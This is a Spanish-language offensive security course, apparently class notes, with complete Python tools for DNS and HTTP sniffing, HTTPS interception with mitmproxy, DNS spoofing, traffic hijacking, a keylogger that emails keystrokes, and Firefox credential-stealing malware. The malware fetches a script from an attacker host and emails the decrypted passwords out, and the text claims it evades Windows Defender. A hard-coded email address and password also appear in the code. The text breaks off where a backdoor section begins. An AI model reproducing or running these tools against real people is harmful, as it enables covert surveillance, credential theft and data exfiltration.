> Un **DNS Sniffer** es una herramienta de reconocimiento pasivo que captura y analiza el tráfico DNS en una red. Al observar las consultas DNS, un atacante puede inferir qué sitios web visitan los usuarios, qué servicios utilizan y qué aplicaciones están en funcionamiento, proporcionando información valiosa para futuras fases de un ataque.

```python
#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def process_dns_packet(packet):

    if packet.haslayer(scapy.DNSQR): # Verificamos si el paquete tiene la capa de Pregunta de Consulta DNS (DNS Question Record).
        domain = packet[scapy.DNSQR].qname.decode() # Extraemos el nombre de dominio de la consulta DNS y lo decodificamos.

        exclude_keywords = ["google", "cloud", "bing", "static"] # Lista de palabras clave a excluir para filtrar dominios comunes y reducir el ruido.

        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords): # Si el dominio no ha sido visto antes y no contiene ninguna palabra clave de exclusión.
            domains_seen.add(domain)
            print(f"[+] Dominio: {domain}")

def main():

    global domains_seen # Declaramos 'domains_seen' como global para que pueda ser modificada por 'process_dns_packet'.
    domains_seen = set() # Usamos un conjunto (set) para almacenar los dominios vistos y evitar duplicados.

    interface = "eth0"
    print(f"\n[+] Interceptando paquetes de la máquina víctima:\n")
    # 'scapy.sniff' nos permite interceptar tráfico. 
    # 'iface' especifica la interfaz de red a escuchar.
    # 'filter="udp and port 53"' filtra solo el tráfico UDP en el puerto 53 (DNS).
    # 'prn=process_dns_packet' llama a la función 'process_dns_packet' para cada paquete capturado.
    # 'store=0' indica que no se almacenen los paquetes en memoria.
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

if __name__ == "__main__":
    main()
```
## **Creando un rastreador de consultas HTTP (HTTP Sniffer) con Scapy**

En esta clase, desarrollaremos un rastreador de consultas HTTP (HTTP Sniffer) enfocado en técnicas ofensivas. El HTTP Sniffer es una herramienta crucial para interceptar y analizar el tráfico HTTP en una red, lo que permite revelar información crítica como cabeceras HTTP, URLs solicitadas, y posiblemente datos de formularios y cookies. Estos datos son esenciales para comprender la comunicación entre clientes y servidores web, y pueden ser explotados para varios tipos de ataques, incluyendo la inyección de código, el secuestro de sesiones y la recopilación de información sensible.

A lo largo de la clase, te enseñaremos cómo capturar de manera efectiva este tipo de tráfico utilizando Scapy, y cómo analizarlo para identificar puntos débiles y oportunidades de ataque en una red. Esta habilidad es invaluable para cualquier estrategia ofensiva en ciberseguridad, proporcionándote un entendimiento profundo de cómo fluye la información en la web y cómo puede ser manipulada para fines de ataque.

> [!warning]
> El sniffing de tráfico HTTP puede exponer información sensible como credenciales y datos personales. Es una técnica de ataque que debe usarse con extrema precaución y solo en entornos autorizados. La interceptación no autorizada de comunicaciones es ilegal en la mayoría de las jurisdicciones.

```python
#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http # Para poder usar la capa HTTP de Scapy.
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo........\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    cred_keywords = ["login", "user", "pass", "password", "username", "email", "name"] # Es una lista de posibles palabras clave para identificar credenciales en las solicitudes.

    if packet.haslayer(http.HTTPRequest): # Si el paquete tiene la capa HTTP Request (solicitud HTTP).

        # Estamos usando los parámetros 'Host' y 'Path' de la capa HTTPRequest para construir la URL completa.
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"\n[+] URL visitada por la víctima: {url}", 'blue'))

        if packet.haslayer(scapy.Raw): # Pedimos la capa Raw, ya que esta suele contener información de usuarios (cuerpo de la solicitud POST).

            # Usamos excepciones para manejar errores al interceptar, como datos no decodificables.
            try:
                response = packet[scapy.Raw].load.decode(errors='ignore') # Tratamos a 'packet' como una lista y le pedimos el paquete 'scapy.Raw'. Con '.load' obtenemos la carga útil y '.decode()' para que esté en texto plano, ignorando errores de decodificación.

                for keyword in cred_keywords: # Con el bucle y el condicional de abajo, buscamos solicitudes que contengan cualquier palabra de la lista y las mostramos.
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}", 'green'))
                        break
            except Exception as e:
                # print(f"[!] Error al decodificar la carga RAW: {e}") # Opcional: para depuración.
                pass


def sniff(interface):
    # 'scapy.sniff' nos permite interceptar tráfico que viene de una interfaz de red.
    # 'iface' especifica la interfaz de red.
    # 'prn=process_packet' llama a la función 'process_packet' para cada paquete capturado.
    # 'store=0' indica que no se almacenen los paquetes en memoria.
    scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():
    sniff("eth0")


if __name__ == "__main__":
    main()
```
## **Creando un rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump**

En esta clase, vamos a sumergirnos en el mundo del espionaje de tráfico HTTPS creando un rastreador de consultas HTTPS (HTTPS Sniffer) con **mitmdump**. **Mitmdump** es una herramienta potente que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor, tanto para HTTP como para HTTPS.

El desafío con el tráfico HTTPS, que está cifrado para proteger la privacidad y seguridad de los datos, es que no se puede leer directamente. Aquí es donde entra en juego la instalación de un certificado en la máquina víctima. Al hacer esto, engañamos al dispositivo para que confíe en nuestro proxy, lo que nos permite descifrar y acceder al contenido del tráfico HTTPS.

Para esta clase, partimos de la base de que ya hemos vulnerado la máquina objetivo. Configuraremos mitmdump para que actúe como un proxy en nuestro equipo, redireccionando así el tráfico de la máquina víctima a través de nuestro sistema. Esto nos da un punto de observación privilegiado para examinar las comunicaciones seguras, una técnica de gran valor en el ámbito ofensivo de la ciberseguridad. Te guiaremos paso a paso en la configuración y el uso de esta herramienta, proporcionándote una habilidad clave para analizar y explotar las comunicaciones seguras en redes.

> [!warning]
> La interceptación de tráfico HTTPS requiere la instalación de un certificado raíz de confianza en el dispositivo de la víctima. Esto es una técnica de ataque MitM y es ilegal sin consentimiento. Solo debe realizarse en entornos de laboratorio controlados y con fines educativos. La manipulación de certificados puede comprometer la seguridad del sistema de la víctima.

En esta ocasión vamos a hacer uso de lo que es mitmproxy, podemos descargar los binarios de la web.
Tenemos que saber que para hacer todo esto ya tenemos que haber ganado acceso a la máquina víctima y haber escalado privilegios.

Ya con eso tenemos que ejecutar el `mitmweb` e instalar en la máquina víctima el certificado para evitar que en esta nos dé el error. Y ya con esto hecho, vamos a ejecutar `mitmproxy` para poder ver el tráfico de la víctima.

```python
#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse # Módulo para analizar URLs en sus componentes (esquema, dominio, ruta, etc.).


def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    url =  packet.request.url
    parsed_url = urlparse(url) # Analizamos la URL para extraer sus componentes.

    scheme = parsed_url.scheme # Protocolo (ej. http, https).
    domain = parsed_url.netloc # Dominio y puerto (ej. www.example.com:80).
    path = parsed_url.path # Ruta del recurso (ej. /login).

    print(f"[+] URL visitada por la víctima: {scheme}://{domain}{path}")

    keywords = ["user", "pass", "password", "username"]
    data = packet.request.get_text() # Obtenemos el cuerpo de la solicitud como texto.

    if has_keywords(data, keywords):
        print(f"[+] Posibles credenciales capturadas: \n{data}\n")
```

## **Creando un rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump**

En esta clase, vamos a construir un rastreador de imágenes por HTTPS usando mitmdump, conocido como **HTTPS Image Sniffer**. Tras haber establecido una configuración de Man-In-The-Middle (MITM) con mitmdump, el objetivo ahora es desarrollar una herramienta que nos permita capturar y visualizar en tiempo real todas las imágenes que un usuario ve en las páginas web que visita.

Este enfoque se centra en el tráfico de imágenes a través de conexiones HTTPS. Con la máquina víctima ya bajo nuestro control y mitmdump operando como proxy, podremos filtrar y captar específicamente las imágenes, proporcionándonos una visión única de la actividad visual del usuario en la web. Este conocimiento y habilidad práctica son vitales en operaciones ofensivas de ciberseguridad, especialmente en tareas de inteligencia y recolección de información.

> [!tip]
> Para que este script de `mitmdump` funcione, asegúrate de que `mitmdump` esté ejecutándose con el comando `mitmdump -s tu_script.py` y que el tráfico de la víctima esté siendo redirigido a tu proxy `mitmdump`. Además, la víctima debe tener el certificado raíz de `mitmproxy` instalado y confiado en su sistema operativo o navegador.

```python
#!/usr/bin/env python3

from mitmproxy import http

def response(packet):

    content_type = packet.response.headers.get("content-type", "") # Obtenemos el tipo de contenido de las cabeceras de la respuesta. Si no existe, devuelve una cadena vacía.

    try:
        if "image" in content_type: # Verificamos si el tipo de contenido indica que es una imagen.
            url = packet.request.url
            extension = content_type.split("/")[-1] # Extraemos la extensión del archivo de la cadena content-type (ej. image/jpeg -> jpeg).

            if extension == "jpeg":
                extension = "jpg" # Normalizamos 'jpeg' a 'jpg' para consistencia.

            # Creamos un nombre de archivo único reemplazando caracteres no válidos en la URL por guiones bajos.
            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
            image_data = packet.response.content # Obtenemos el contenido binario de la imagen.

            # Aseguramos que el directorio 'images' exista.
            import os
            if not os.path.exists("images"):
                os.makedirs("images")

            with open(file_name, "wb") as f: # Abrimos el archivo en modo escritura binaria ('wb').
                f.write(image_data) # Escribimos los datos binarios de la imagen en el archivo.

            print(f"[+] Imagen guardada: {file_name}")

    except Exception as e:
        # print(f"[!] Error al guardar la imagen: {e}") # Opcional: para depuración.
        pass
```

## **Creando un DNS Spoofer con Scapy y NetfilterQueue**

En esta clase, vamos a crear un DNS Spoofer utilizando Scapy y NetfilterQueue. Este proyecto se centra en manipular las solicitudes DNS de una red para redirigir el tráfico a un destino elegido por nosotros, como atacantes.

La herramienta clave aquí es **iptables**, una utilidad de línea de comandos en sistemas Linux que permite configurar las reglas del firewall del sistema operativo. Usaremos iptables para redirigir todo el tráfico DNS (normalmente en el puerto 53) a una cola NFQUEUE. NFQUEUE es una funcionalidad de iptables que nos permite interceptar paquetes de la red, procesarlos con un programa externo (en este caso, nuestro DNS Spoofer creado con Scapy) y luego decidir si aceptarlos, descartarlos o modificarlos.

Al configurar iptables para enviar los paquetes DNS a NFQUEUE, podemos utilizar Scapy para inspeccionar y modificar estos paquetes. Por ejemplo, cuando la víctima intenta resolver un dominio, podemos cambiar la respuesta para que la IP resuelta sea la nuestra, no la legítima. Esto permite realizar ataques de tipo Man-In-The-Middle, donde redirigimos al usuario a un servidor bajo nuestro control en lugar del servidor real, lo que puede ser utilizado para una variedad de propósitos maliciosos, como phishing o inyección de contenido.

> [!warning]
> La manipulación de respuestas DNS (DNS Spoofing) es una técnica de ataque MitM muy potente que puede redirigir a los usuarios a sitios web maliciosos. Es ilegal y altamente perjudicial si se realiza sin autorización. Utiliza esta técnica solo en entornos de laboratorio controlados y con fines educativos. Asegúrate de limpiar las reglas de `iptables` después de su uso.

Los comandos para la configuración de iptables son:
```bash
sudo iptables -I INPUT -j NFQUEUE --queue-num 0

sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0

sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# Esta última es para que nos permita redirigir las peticiones al servidor.

sudo iptables --policy FORWARD ACCEPT

# También tenemos que instalar netfilterqueue con el siguiente comando:

sudo apt install libnetfilter-queue-dev

pip3 install netfilterqueue


# Para restaurar las IPtables sería:

sudo iptables -D INPUT -j NFQUEUE --queue-num 0

sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0

sudo iptables -D FORWARD -j NFQUEUE --queue-num 0

sudo iptables --policy FORWARD ACCEPT

```

Esta clase te brindará una comprensión profunda y habilidades prácticas en la manipulación del tráfico de red y en la ejecución de ataques de spoofing DNS, una técnica poderosa en el arsenal de ciberseguridad ofensiva.

```python
#!/usr/bin/env python3

import netfilterqueue # Módulo para interactuar con las colas de Netfilter.
import scapy.all as scapy # Biblioteca para manipulación de paquetes de red.
import sys
from termcolor import colored
import signal


def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo.....\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload()) # Convertimos el paquete de NetfilterQueue a un objeto Scapy para poder interpretarlo y manipularlo.

    if scapy_packet.haslayer(scapy.DNSRR): # Verificamos si el paquete tiene la capa de Respuesta de Consulta DNS (DNS Resource Record).
        qname = scapy_packet[scapy.DNSQR].qname # Extraemos el nombre de dominio de la pregunta DNS.

        if b"hack4u.io" in qname: # Si el nombre de dominio contiene "hack4u.io" (el dominio que queremos suplantar).
            print(f"[+] Envenenando el dominio {qname.decode()}")

            # Creamos una respuesta DNS falsa. 'rrname' es el nombre del recurso, 'rdata' es la dirección IP falsa.
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.67") # Reemplaza con la IP de tu servidor malicioso.
            scapy_packet[scapy.DNS].an = answer # Asignamos nuestra respuesta falsa al campo de respuestas del paquete DNS.
            scapy_packet[scapy.DNS].ancount = 1 # Indicamos que hay una respuesta en el paquete DNS.

            # Eliminamos los campos de longitud y checksum de las capas IP y UDP.
            # Scapy los recalculará automáticamente al construir el paquete, lo cual es crucial para que el paquete sea válido después de la modificación.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            
            packet.set_payload(scapy_packet.build()) # Reemplazamos el payload original del paquete con nuestro paquete Scapy modificado.


    packet.accept() # Aceptamos el paquete para que continúe su camino en la red (modificado o no).


queue = netfilterqueue.NetfilterQueue() # Instanciamos un objeto de la clase NetfilterQueue.
queue.bind(0, process_packet) # Nos permite asociarnos a un número de cola (en este caso, el 0) y cada paquete que llega a esa cola es tratado por la función 'process_packet'.
queue.run() # Esto se encuentra corriendo en espera, procesando paquetes de la cola.
```

## **Creando un Manipulador e Interceptor de Tráfico (Traffic Hijacking)**

En esta clase, nos enfocaremos en crear un Manipulador e Interceptor de Tráfico, también conocido como **Traffic Hijacking**, una técnica avanzada en ciberseguridad ofensiva. El objetivo es aprender a controlar y alterar el tráfico de red para manipular lo que un usuario ve en respuesta a sus acciones en la web.

Para lograr esto, utilizaremos de nuevo la herramienta NetfilterQueue en combinación con iptables. NetfilterQueue nos permite interceptar paquetes que pasan por la red y manipularlos antes de que continúen su camino. Mediante iptables, redirigiremos el tráfico relevante (como las solicitudes HTTP/HTTPS) a una cola NFQUEUE, donde podremos inspeccionar y modificar estos paquetes utilizando un script personalizado.

Una aplicación práctica de esta técnica es alterar las respuestas de las solicitudes web. Por ejemplo, cuando un usuario solicita una página web, podemos interceptar la respuesta del servidor y modificarla antes de que llegue al usuario. Esto puede incluir cambiar textos, insertar scripts maliciosos, redirigir a sitios de phishing, entre otros. Es una forma poderosa de controlar la experiencia del usuario en la web y puede ser utilizada para una variedad de propósitos malintencionados.

Esta clase te proporcionará las habilidades y el conocimiento necesarios para realizar ataques de hijacking de tráfico, enseñándote cómo manipular el tráfico de red en tiempo real para alterar la información que recibe el usuario final.

> [!warning]
> El Traffic Hijacking es una técnica de ataque muy intrusiva que permite modificar el contenido de las comunicaciones de red en tiempo real. Su uso no autorizado es ilegal y puede tener graves consecuencias. Limita su práctica a entornos de laboratorio controlados y con fines educativos. Asegúrate de limpiar las reglas de `iptables` después de su uso.

```python
#!/usr/bin/env python3

import netfilterqueue # Módulo para interactuar con las colas de Netfilter.
import scapy.all as scapy # Biblioteca para manipulación de paquetes de red.
import re # Módulo para expresiones regulares, útil para modificar el contenido de los paquetes.

def set_load(packet, load):
    packet[scapy.Raw].load = load # Establecemos la nueva carga útil (payload) en la capa Raw del paquete.

    # Eliminamos los campos de longitud y checksum de las capas IP y TCP.
    # Scapy los recalculará automáticamente al construir el paquete, lo cual es crucial para que el paquete sea válido después de la modificación.
    del packet[scapy.IP].len 
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    print(packet.show()) # Muestra una representación detallada del paquete modificado (útil para depuración).

    return packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload()) # Convertimos el paquete de NetfilterQueue a un objeto Scapy para poder interpretarlo y manipularlo.

    if scapy_packet.haslayer(scapy.Raw): # Filtramos por los paquetes que contengan la capa Raw (que suele contener el cuerpo de datos HTTP).
        try:
            if scapy_packet[scapy.TCP].dport == 80: # Filtramos por los paquetes que en su capa TCP tienen el puerto de destino 80 (HTTP).
                print(f"\n[+] Solicitud HTTP interceptada:\n")
                # Modificamos la carga útil para eliminar la cabecera 'Accept-Encoding', evitando que el servidor envíe contenido comprimido que sería difícil de modificar.
                modifed_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) 
                new_packet = set_load(scapy_packet, modifed_load) # Con otra función modificamos el paquete.
                packet.set_payload(new_packet.build()) # Enviamos el paquete ya modificado de vuelta a la cola.

            elif scapy_packet[scapy.TCP].sport == 80: # Filtramos por los paquetes que en su capa TCP tienen el puerto de origen 80 (respuesta HTTP del servidor).
                print(f"\n[+] Respuesta del servidor HTTP interceptada: \n")

                # Modificamos la carga útil de la respuesta para reemplazar un enlace específico por otro (ej. de Acunetix a Facebook).
                modifed_load = scapy_packet[scapy.Raw].load.replace(b"<a href=\"https://www.acunetix.com/vulnerability-scanner/\">", b"<a href=\"https://facebook.com/\">") 
                new_packet = set_load(scapy_packet, modifed_load) # Generamos un nuevo paquete con la carga modificada.
                packet.set_payload(new_packet.build()) # Reemplazamos el paquete original por el que tiene las modificaciones.

        except Exception as e:
            print(f"\n[!] Error al procesar el paquete: {e}")

    packet.accept() # Aceptamos el paquete para que continúe su camino en la red (modificado o no).


queue = netfilterqueue.NetfilterQueue() # Instanciamos un objeto de la clase NetfilterQueue.
queue.bind(0, process_packet) # Con 'bind' nos asociamos al número de identificador de cola (en este caso, el 0), y tratamos los paquetes en la función 'process_packet'.
queue.run() # Mantenemos un bucle en escucha, procesando paquetes de la cola.
```

## **Creando un Keylogger**

En esta clase, nos adentraremos en la creación de un **keylogger**, una herramienta fundamental en el mundo de la ciberseguridad ofensiva. Para esto, utilizaremos la biblioteca **pynput** de Python, que es una herramienta efectiva para monitorear y registrar las pulsaciones de teclado.

**Pynput** es una biblioteca que nos permite controlar y monitorear la entrada del usuario desde el teclado y el ratón. En el contexto de un keylogger, nos centraremos en la capacidad de pynput para registrar cada tecla presionada en el teclado. Esto es especialmente útil en escenarios de ciberseguridad ofensiva, donde la recopilación de pulsaciones de teclas puede revelar información sensible como contraseñas, mensajes privados o cualquier otro tipo de datos ingresados a través del teclado.

El aspecto clave de esta clase será no solo registrar estas pulsaciones, sino también aprender a enviar esta información de manera automática y discreta por correo electrónico. Esto implica configurar un sistema que agrupe las pulsaciones de teclas capturadas y las envíe periódicamente a una dirección de correo electrónico especificada. Esta funcionalidad aumenta la eficacia del keylogger, permitiéndonos acceder a la información capturada de forma remota y continua, lo cual es crucial para operaciones prolongadas de vigilancia o recopilación de datos.

Te guiaremos a través de todo el proceso de configuración del keylogger, desde la captura de las pulsaciones de teclas hasta la implementación del sistema de envío de correos electrónicos, proporcionándote una comprensión completa de cómo se pueden utilizar estas herramientas en escenarios de ciberseguridad ofensiva.

En esta clase, finalizaremos nuestra herramienta de keylogger desarrollada con la biblioteca **pynput** de Python. Esta sesión se centrará en perfeccionar y completar las funcionalidades del keylogger, asegurándonos de que sea eficiente, discreto y totalmente operativo.

El aspecto principal que abordaremos será la optimización del proceso de captura de pulsaciones de teclas y el mecanismo de envío automático de estas por correo electrónico. Refinaremos la programación para que el keylogger funcione de manera fluida y eficaz, minimizando su detectabilidad y maximizando la calidad y relevancia de los datos capturados. Además, nos aseguraremos de que el sistema de envío de correos electrónicos sea seguro y confiable, para que las pulsaciones registradas lleguen periódicamente a la dirección de correo especificada sin problemas.

También cubriremos aspectos avanzados, como la configuración de intervalos de tiempo para el envío de correos, la gestión de errores y la optimización del rendimiento del keylogger para garantizar que funcione de manera efectiva en diferentes escenarios. Al final de esta clase, tendrás una herramienta de keylogging robusta y práctica, lista para ser desplegada en situaciones reales de ciberseguridad ofensiva, con un entendimiento claro de cómo operarla y adaptarla a tus necesidades específicas.

> [!warning]
> La creación y despliegue de un keylogger es una actividad altamente intrusiva y, en la mayoría de los contextos, ilegal. Su uso no autorizado constituye una violación grave de la privacidad. Este contenido es estrictamente educativo y debe ser practicado únicamente en entornos de laboratorio controlados y con el consentimiento explícito de todas las partes involucradas.

```python
#!/usr/bin/env python3

import pynput.keyboard # A través de esta librería vamos a encargarnos de identificar las pulsaciones del teclado.
import threading # Módulo para ejecutar tareas en segundo plano (hilos).
import smtplib # Módulo para enviar correos electrónicos utilizando el protocolo SMTP.
from email.mime.text import MIMEText # Clase para crear mensajes de correo electrónico de texto plano.


class Keylogger:

    def __init__(self):
        self.log = ""
        self.requests_shutdown = False
        self.timer = None
        self.is_first_run = True

    def format_string(self, string):

        self.log = string[:-1] # Nos ayuda a eliminar el último carácter (ej. un espacio o una letra al pulsar backspace) de la cadena de registro.

    def pressed_key(self, key):
        try:
            self.log += str(key.char) # Siempre que sean letras o números, se agrega el carácter al registro.

        except AttributeError: # Se captura AttributeError cuando la tecla presionada no tiene un atributo '.char' (es decir, es una tecla especial).

            special_keys = {pynput.keyboard.Key.space: " ", pynput.keyboard.Key.enter: " [ENTER] ", # Se corrigió el formato de [ENTER]
                        pynput.keyboard.Key.shift: " [SHIFT] ", pynput.keyboard.Key.ctrl: " [CTRL] ", pynput.keyboard.Key.alt: " [ALT] " # Se agregaron más teclas especiales.
                        }

            if key == pynput.keyboard.Key.backspace:
                self.format_string(self.log) # Llama a la función para eliminar el último carácter del log.
                pass
            else:
                self.log += str(special_keys.get(key, f" [{str(key).replace('Key.', '').upper()}] ")) # Agregamos la representación de la tecla especial, usando .get() para manejar teclas no definidas y formateando el nombre.

    # Lógica para el envío de mensajes por correo.
    def send_email(self, subject, body, sender,recipients, password):
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server: # Establece una conexión segura SSL/TLS con el servidor SMTP de Gmail en el puerto 465.
            smtp_server.login(sender, password) # Inicia sesión en el servidor SMTP con las credenciales proporcionadas.
            smtp_server.sendmail(sender, recipients, msg.as_string()) # Envía el correo electrónico.

        print(f"\n[+] Email sent Successfully!\n")


    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente." if self.is_first_run else self.log # El cuerpo del correo será un mensaje de inicio o el registro de teclas.
        self.send_email("Keylogger Report", email_body, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # Enviamos los parámetros para enviar el email.
        self.log = "" # Limpiamos el log después de enviarlo.

        if self.is_first_run: # Esto nos permite controlar el primer mensaje para saber si ya comenzó la ejecución del keylogger.
            self.is_first_run = False

        if not self.requests_shutdown:
            self.timer = threading.Timer(30, self.report) # En esta función aplicamos recursividad: se ejecuta la misma función cada 30 segundos gracias a 'threading.Timer'.
            self.timer.start() # Comienza el temporizador.



    def shutdown(self):
        self.requests_shutdown = True

        if self.timer: # Si el temporizador está activo, entra en el condicional.
            self.timer.cancel() # Nos permite acabar con la última traza ejecutada del temporizador.

    def start(self):
        # En este punto definimos el objeto Listener, el cual con 'on_press' va a enviar cada pulsación de tecla a la función 'pressed_key'.
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) 

        with keyboard_listener: # Con el manejador de contexto del listener, ya no es necesario cerrarlo o terminarlo explícitamente.
            self.report()
            keyboard_listener.join() # Esto inicia el listener y lo mantiene en ejecución hasta que se detenga.

```

```python
#!/usr/bin/env python3

from keylogger import Keylogger
import sys
import signal
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo.........", 'red'))
    my_keylogger.shutdown() # Aseguramos que el temporizador del keylogger se detenga limpiamente.
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


if __name__ == "__main__":
    my_keylogger = Keylogger()
    my_keylogger.start()
```

## **Creación de Malware**

En esta clase, nos centraremos en la creación de un malware diseñado para obtener y enviar las credenciales almacenadas en Firefox por correo electrónico en texto claro. Este ejercicio proporcionará una comprensión práctica de cómo se pueden explotar las aplicaciones comunes para acceder a información sensible.

Nuestro primer paso será trabajar con el archivo '**logins.json**' de Firefox, donde se almacenan las credenciales de los usuarios de manera cifrada. Aprenderemos a localizar y acceder a este archivo, entenderemos su estructura y, lo más importante, cómo podemos descifrar estas credenciales almacenadas para obtener la información en texto claro.

Después de extraer las credenciales, el siguiente paso será programar la funcionalidad para enviar esta información por correo electrónico. Este proceso garantizará que las credenciales recopiladas se transmitan de manera eficiente y segura al atacante.

Por último, convertiremos nuestro script de Python en un archivo ejecutable '**exe**' usando PyInstaller. Este paso es crucial para asegurarnos de que nuestro malware pueda operar en sistemas Windows. Además, el malware que desarrollaremos en esta clase no será detectado por Windows Defender, lo que demuestra una aplicación práctica de cómo se pueden diseñar programas maliciosos para pasar inadvertidos por las medidas de seguridad estándar.

Al concluir esta clase, tendrás una visión clara de cómo se crea y se implementa malware en entornos reales y cómo se puede acceder y transmitir datos sensibles de manera encubierta.

> [!warning]
> La creación y despliegue de malware para robar credenciales es una actividad ilegal y altamente destructiva. Este contenido es estrictamente educativo y debe ser practicado únicamente en entornos de laboratorio controlados y con el consentimiento explícito de todas las partes involucradas. El uso indebido de estas técnicas puede acarrear graves consecuencias legales.

```python
#!/usr/bin/env python3
# coding: cp850

import subprocess # Para ejecutar comandos del sistema operativo.
import smtplib # Para enviar correos electrónicos.
from email.mime.text import MIMEText # Para crear mensajes de correo electrónico.
import requests # Para realizar solicitudes HTTP (descargar el script de descifrado).
import tempfile # Para crear archivos y directorios temporales.
import os # Para interactuar con el sistema operativo (rutas de archivos, directorios).
import sys # Para interactuar con el sistema (salida del programa).

def run_command(command):

    try:
        output = subprocess.check_output(command, shell=True) # Ejecuta el comando en un shell y captura su salida.
        return output.decode("cp850").strip() if output else None # Decodifica la salida usando cp850 (común en Windows) y elimina espacios en blanco.
        
    except Exception as e:
        print(f"\n[!] Error al ejecutar el comando {command}. Error: {e}")
        return None
  

def send_email(subject, body, sender,recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)


        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")

def get_Navegator_profiles(username):
    path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles" # Ruta base de los perfiles de Firefox.

    try:
        # Lista los directorios dentro de la ruta de perfiles y filtra aquellos que contienen "release" (perfiles de usuario estándar).
        profiles = [profile for profile in os.listdir(path) if "release" in profile]
        return profiles[0] if profiles else None # Retorna el primer perfil encontrado o None si no hay.
        
    except Exception as e:
        print(f"\n[!] No ha sido posible obtener los perfiles de Firefox: {e}")
        return None

  
def get_firefox_passwords(username, profile):

    r = requests.get("http://192.168.1.109/firefox_decrypt.py") # Descarga un script de descifrado de Firefox desde un servidor controlado por el atacante.
    temp_dir = tempfile.mkdtemp() # Crea un directorio temporal para almacenar el script descargado.
    os.chdir(temp_dir) # Cambia el directorio de trabajo actual al directorio temporal.
  

    with open("firefox_decrypt.py", "wb") as f:
        f.write(r.content) # Guarda el contenido del script descargado en un archivo temporal.

    # Ejecuta el script de descifrado de Firefox, pasándole la ruta del perfil del usuario.
    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
    passwords = run_command(command) # Captura la salida del script, que debería contener las contraseñas descifradas.
    os.remove("firefox_decrypt.py") # Elimina el script de descifrado del directorio temporal.
    return passwords
  
  
def main():

    username_str = run_command("whoami") # Obtiene el nombre de usuario actual del sistema.
    username = username_str.split("\\")[1] # Extrae solo el nombre de usuario de la cadena (ej. DOMINIO\usuario -> usuario).
    profiles = get_Navegator_profiles(username)
  

    if not username or not profiles:
        sys.exit(f"\n[!] No ha sido posible obtener el nombre de usuario o perfiles válidos para Firefox")

    passwords = get_firefox_passwords(username, profiles)

    if passwords:

        send_email("Decrypted Firefox Passwords", passwords, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # Enviamos los parámetros para enviar el email con las contraseñas.

    else:
        print(f"[!] No se encontraron contraseñas de Firefox.\n") # Corregido el print.

if __name__ == "__main__":

    main()
```

## **Creación de Backdoors y Command and Control (C&C)**

En esta clase, nos adentraremos en el mundo de los backdoors y los sistemas de Command and Control (**C&C**). Nuestro objetivo será crear un ejemplo práctico de un ejecutable que, una vez en la máquina víctima, nos permita operar desde un centro de comando y control creado manualmente en Python. Esta herramienta nos dará la capacidad de controlar y ejecutar una variedad de operaciones en la máquina comprometida de forma automática.

El backdoor que desarrollaremos actuará como una puerta trasera en la máquina objetivo, proporcionándonos acceso remoto y control sobre el sistema. Por otro lado, el sistema C&C será el centro de operaciones desde donde enviaremos comandos y recibiremos información de la máquina infectada. Este sistema es esencial en operaciones ofensivas avanzadas, ya que nos permite gestionar múltiples backdoors y coordinar acciones complejas en los sistemas comprometidos.

Durante la clase, exploraremos cómo se pueden diseñar y desplegar backdoors eficaces y cómo se estructura un sistema C&C para maximizar su efectividad. También abordaremos la importancia de los sistemas C2 (Command and Control) en la ciberseguridad ofensiva, especialmente en lo que respecta a la automatización y la gestión remota de tareas en máquinas comprometidas.

Esta sesión te proporcionará conocimientos prácticos y habilidades esenciales para entender y desarrollar sistemas de backdoors y C&C, herramientas fundamentales para cualquier operación ofensiva en el ámbito de la ciberseguridad.

> [!warning]
